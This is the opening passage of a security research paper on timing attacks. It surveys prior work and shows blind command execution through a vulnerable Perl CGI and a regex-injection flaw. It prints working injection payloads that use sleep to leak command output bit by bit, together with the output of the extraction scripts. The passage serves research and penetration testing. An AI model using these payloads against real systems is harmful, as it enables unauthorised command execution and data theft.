It’s all about the timing. . .
Haroon Meer and Marco Slaviero
{haroon,marco}@sensepost.com
SensePost
Abstract
This paper is broken up into several distinct parts, all
related loosely to timing and its role in information se-
curity today. While timing has long been recognized
as an important component in the crypt-analysts arse-
nal, it has not featured very prominently in the domain
of Application Security Testing.
This paper aims at
highlighting some of the areas in which timing can be
used with great eﬀect, where traditional avenues fail. In
this paper, a brief overview of previous timing attacks
is provided, the use of timing as a covert channel is
examined and the eﬀectiveness of careful timing during
traditional web application and SQL injection attacks is
demonstrated. The use of Cross Site Timing in bypass-
ing the Same Origin policy is explored as we believe
the technique has interesting possibilities for turning
innocent browsers into bot-nets aimed at, for instance,
brute-force attacks against third party web-sites.
1
Introduction
The movement of applications onto the Web has not
removed old threats, it has perhaps just coated them
a little with the veneer of AJAX and pastel colours.
Underneath, the old issues are still present.
In this
paper, we examine one really ancient class of vulner-
abilities, timing attacks, and carry to its logical con-
clusion the combination of malicious websites, innocent
victims, JavaScript and a healthy dose of timing mea-
surements. Occasionally the websites are not malicious
and the victims not entirely innocent, but the timing
measurements remain throughout.
We start with a background on timing attacks in
Section 2, and discuss timing as a covert channel in
Section 3. Section 4 is lengthy and shows how the mi-
gration from regular DNS tunnels to timing channels
reduce the bandwidth of output retrieval in SQL injec-
tion, but also reduce the requirements placed on the
targeted database. In Section 5 we discuss using timing
to enumerate users in a web application using crypto de-
vices and examine the intersection between timing and
privacy violations in Section 6. Recent attacks called
‘cross-site timing’ are dealt with in Section 7 and fur-
ther discussions on this attack are presented in Sec-
tion 8. Finally, we conclude in Section 9.
2
Background
Timing attacks are not new. It seems that with each
successive generation of computing technologies and se-
curity techniques, timing attacks have appeared that
partially or entirely circumvent protections built to limit
more obvious attack vectors. Classiﬁed as a side-channel
attack, timing attacks are grouped with power and ra-
diation analysis in that they exploit side-eﬀects of the
system under observation, rather than directly attempt-
ing to overcome the system’s security mechanisms. Of-
ten the targeted system is one of a cryptographic na-
ture; hence many timing attacks to date have focused
on techniques for recovery of cryptographic keys. 1
Kocher’s attack against implementations of Diﬃe-
Hellman [4] and RSA [5] exploited timing diﬀerences to
recover bits from the secret key [2]. Similarly, Percival
showed that processors that support Hyper-Threading
are vulnerable to a cache miss timing attack, whereby
a malicious process running alongside a victim process
can infer information about the operations of the victim
process, based on the pattern of cache misses that were
detected through timing diﬀerences. It was further pos-
sible to associate operations with bits in a secret key,
leading to the leaking of about 320 bits in a 512-bit
key [6].
Of course, timing attacks over networks were emi-
nently possible, even with the added noise of latency
and remote processor load. Again, the target was the
derivation of secret keys. In an attack against the Open-
SSL library [7], it was shown that a network-based at-
tacker could derive the secret key by crafting speciﬁc
responses in the SSL handshake and measuring time
diﬀerences, because OpenSSL did not implement con-
stant time decryption of RSA [3]. A second network-
based attack against the newer AES algorithm showed
how inherent ﬂaws in the algorithm left it susceptible
to a timing attack that permitted the remote derivation
of a complete key [8].
Turning away from key-focused attacks, Felten and
Schneider demonstrated how timing attacks could be
used to snoop on Internet users’ browsing histories [9].
Their paper discussed four examples of cache-based tim-
1Power and radiation analysis tends to be used on hardware
devices such as smart-cards [1, 2], and requires special tools and
physical access [3].
1
ing attacks:
Web caching Used Java- or JavaScript-based timings
to detect if a given page was in the browser’s
cache, inferring that it had been visited before.
Two technique were demonstrated for determin-
ing threshold values depending on whether the
time distribution of hits and misses was known or
not. En extension of this attack showed how a
server-side application could detect timing diﬀer-
ences without any client-side Java or JavaScript.
DNS caching Used a Java applet to execute DNS que-
ries; by measuring the time diﬀerence it was pos-
sible to determine if the domain name was in the
DNS cache implying that the user had visited the
site.
Multi-level caching Both DNS and HTTP request
are often cached at multiple levels (consider cach-
ing DNS and HTTPS proxies). An attacker can
determine if users share a common cache, by ap-
ply techniques similar to the attacks against the
browser’s cache.
Cache cookies The notion of a ‘cache cookie’ was in-
troduced in the paper, which describes a method
of storing a permanent ‘cookie’ in the browser’s
cache that is accessible to any site.
In 2006, JavaScript portscanners were simultaneous
published at the BlackHat USA [10, 11]. Both speakers
made use of JavaScript and the browsers onload and on-
error features to determine if the “pinged” hosts were
available and contactable. The goal of most JavaScript
malware to date has been to bypass the browser’s “Same
Origin Policy”, which exists to prevent a document or
script loaded from one origin from accessing proper-
ties of a document from loaded another origin. From
the Mozilla speciﬁcation: “[we consider] two pages to
have the same origin if the protocol, port (if given),
and host are the same for both pages” [12]. Interest-
ingly enough, the model does indeed allow a script on
http://store.company.com/dir/page.html to deter-
mine how long a page took for any or all of the ‘failure’
resources to load.
In a recent paper, Bortz, Boneh and Nandy [13]
demonstrated how vulnerable common web application
were, to timing attacks that allowed an attacker to de-
rive information about a site, based solely on the length
of time the application took to respond. In their direct
attack, they could determine the validity of a candi-
date username on the application’s login page, since
the running time of code paths within the application
were measurably diﬀerent, depending on whether the
candidate username was valid or not. They also intro-
duced the term ‘cross-site timing’ to describe a class
of attacks where an attacker used client-side JavaScript
timing attacks to snoop on the victim’s proﬁle on third
party sites (their example was to determine the number
of items in the victim’s online shopping cart.)
Figure 1: Bird’s Eye CGI
3
Timing as a (covert) channel
Most recent textbooks covering information security will
make mention of timing attacks, alongside salami slicing
and trap-doors. It is fairly commonplace for undergrad-
uate students to ﬁeld an examination question on how
clever timing attacks can be used in the “real-world”.
Sadly, few of the texts examined by the authors showed
anything particularly clever or real-world.
Although less commonly found in the wild today,
poorly coded web applications cobbled together with
horribly insecure Perl/Bash scripts running on top of
*nix boxes and Apache were the norm a few years ago.
An example our employer has used for many years in
training classes was a sample network administration
CGI form plucked from the web (and deliberately weak-
ened). It is shown in Figure 1.
The application simply passes the user supplied tar-
get to the underlying operating system with an exec()
/ system() call.
$target = $user input;
print system("ping $target");
Figure 2: Code returns output
The fact that this application returns the output of
the command to the user, implies two things:
1. it is an attackers dream;
2. it is obviously trivial to determine that the at-
tacker is executing code on the target machine.
In Figure 3 a directory listing is shown after executing
a command in the vulnerable CGI.
Of course, each application is designed diﬀerently
and most do not provide such a comfortable return
channel for an attacker to view the output of his com-
mands. For example, Figure 4 shows a code snippet
in which arbitrary code exeuction takes places, but the
output is not directly shown to the user.
In such a case the attacker has several options to
determine if his parameter is being passed unmolested
to the system call (in order to determine if he eﬀectively
2
Figure 3: Executing ls -al on vulnerable CGI
$target = $user input;
$result = ‘ping $target’;
if($target =
/host is up./)
{
print(‘‘$target is Up!’’);
}
Figure 4: Code does not return output
has remote command execution.) Historically, a grab-
bag of possibilities have been examined, ranging from
writing ﬁles in the document root to calling home to
inform the attacker of his success. One such technique
that has often been discussed was to simply cause the
application to perform some activity that would run for
a suﬃcient period of time in order to observe how long
the application took to complete within the browser.
This is a classic use of timing to determine if the
command executed successfully. While this technique
has been used for years, we have not seen any exam-
ples of this technique being actively explored. We were
forced to do this however when facing a web application
on a remote server which had been suﬃciently hardened
(in every other respect.) The server in question resided
on a well ﬁrewalled DMZ which both limited access to
the server and prevented the server from initiating com-
munication with hosts on the Internet.
To make matters worse, this box also had a read-
only ﬁle system, eﬀectively preventing the analyst from
simply writing a ﬁle to the webroot. The single ﬂaw
made by the application was to use un-sanitised and
user-supplied data within a regular expression search
on a data-set, reproduced in Figure 5.
It is clear in this example that the application is
vulnerable to a regular expression injection attack. This
means that by making use of Perl’s regular expression
$search term = $user input;
if($recordset =
/$search term/ig)
{
do stuff();
}
Figure 5: Insecure regular expression handling
eval command, we were able to pass a search term to
the application that was then be executed, Figure 6.
Figure 6: Executing uname
Robbed of alternatives to determine if the command
actually did execute, the analyst opted to use timing by
making use of the sleep command, shown in Figure 7.
The (roughly) 20 seconds it took for the page load to
complete gave suﬃcient proof that commands were exe-
cuting on the system. However, a useful return channel
was needed in order to retrieve execution output. Be-
fore going ahead, we needed to determine how much
timing noise was added. To this end we created a quick
script to test the variance of collected times. An exam-
ple of the running of this script in given in Figure 8.
3
wh00t: /customers/bh haroon$ python time poster.py
[*] Command:
(?{‘sleep 1‘;})
[*] Encoded:
%28%3f%7b%60%73%6c%65%65%70+%31%60%3b%7d%29
[*] Sending , Got Response:
HTTP/1.1 200
[*] Took 2.1775188446 secs to complete
[*] Minus 1.1 sec avg response time - 1.0
[*] Command:
(?{‘sleep 4‘;})
[*] Encoded:
%28%3f%7b%60%73%6c%65%65%70+%34%60%3b%7d%29
[*] Sending , Got Response:
HTTP/1.1 200
[*] Took 4.98084998131 secs to complete
[*] Minus 1.1 sec avg response time - 4.0
[*] Command:
(?{‘sleep 14‘;})
[*] Encoded:
%28%3f%7b%60%73%6c%65%65%70+%31%34%60%3b%7d%29
[*] Sending , Got Response:
HTTP/1.1 200
[*] Took 15.1603910923 secs to complete
[*] Minus 1.1 sec avg response time - 14.0
Figure 8: Testing response time variance
Figure 7: Executing sleep20
We initially assumed that this degree of conﬁdence
was a requirement for a successful attack. We will later
show why this is not the case making such a channel
far more reliable and far easier than imagined.
It was also possible to daisy chain instances of the
Perl interpreter, instead of simply running uname (or
sleep). This yielded much greater control over the way
commands were executed, and expanded the possibili-
ties for handling execution output:
(?‘sleep 10‘;)
(?‘perl -e ’system(‘‘sleep’’,‘‘10’’);’‘;)
Both commands are essentially the same, but the sec-
ond line provides a much greater ability to control the
output of commands. This lead to the following injec-
tion string: 2
(?‘perl -e ’sleep(ord(substr(qx/uname/,
0,1)))’‘;)
2Character escaping is ignored in this example; real attacks
would require manipulation of the string.
If the injection string is broken down into smaller pieces,
its function becomes clearer:
1. Run the command uname
2. Grab the ﬁrst character of the response (substr))
3. Get the ordinal of that character (ord)
4. Sleep for the duration of the ordinal (sleep)
By scripting this injection string, it is trivial to ob-
tain the output of any command, as shown in Figure 9.
While this method does indeed work, it has some obvi-
ous shortcomings:
• Latency on the line (or intermittent latency on
the line) will cause errors.
• Our analysts fall asleep while waiting 10 minutes
to get 5-character results.
A solution to both issues is to get away from the
ordinal value of each character and to examine each
character instead as a series of bits. This requires one
round in the code:
1. Run the command uname
2. Grab the ﬁrst character of the response (substr))
(a) Get the ordinal binary representation of that
character
(b) Read the ﬁrst bit of the binary representa-
tion.
(c) Sleep for the duration of the bit (multiplied
by some attacker chosen constant) (ie. Sleep
1 * 5 if the ﬁrst bit is 1, and the attacker has
chosen 5 has his constant)
4
wh00t: /customers/bh haroon$ python timing.py ‘‘uname’’
[*] POST built and encoded
[*] Got Response:
HTTP/1.1 200
[*] [83.0] seconds
[*] [’S’]
[*] POST built and encoded
[*] Got Response:
HTTP/1.1 200
[*] [83.0, 117.0] seconds
[*] [’S’, ’u’]
[*] POST built and encoded
[*] Got Response:
HTTP/1.1 200
[*] [83.0, 117.0, 110.0] seconds
[*] [’S’, ’u’, ’n’]
[*] POST built and encoded
[*] Got Response:
HTTP/1.1 200
[*] [83.0, 117.0, 110.0, 79.0] seconds
[*] [’S’, ’u’, ’n’, ’O’]
[*] POST built and encoded
[*] Got Response:
HTTP/1.1 200
[*] [83.0, 117.0, 110.0, 79.0, 83.0] seconds
[*] [’S’, ’u’, ’n’, ’O’, ’S’]
[*] POST built and encoded
[*] Got Response:
HTTP/1.1 200
[*] [83.0, 117.0, 110.0, 79.0, 83.0, 10.0] seconds
[*] [’S’, ’u’, ’n’, ’O’, ’S’, ’\n’]
Figure 9: Character-based timing script
wh00t: /customers/bh haroon$ python oneTimeITWeb.py
‘‘uname’’ 2
oneTime - PI:EMAIL
Dont tell your webserver free from attack
[*] 01010011 [’S’]
[*] 01110101 [’S’, ’u’]
[*] 01101110 [’S’, ’u’, ’n’]
[*] 01001111 [’S’, ’u’, ’n’, ’O’]
[*] 01010011 [’S’, ’u’, ’n’, ’O’, ’S’]
[*] 00001010 [’S’, ’u’, ’n’, ’O’, ’S’, ’\n’]
Figure 10: Bit-based timing script
5
(d) Read the next bit in the stream until all eight
are done.
3. Read next character of the response and jump to
Step 2
In Figure 10, the second argument given to the script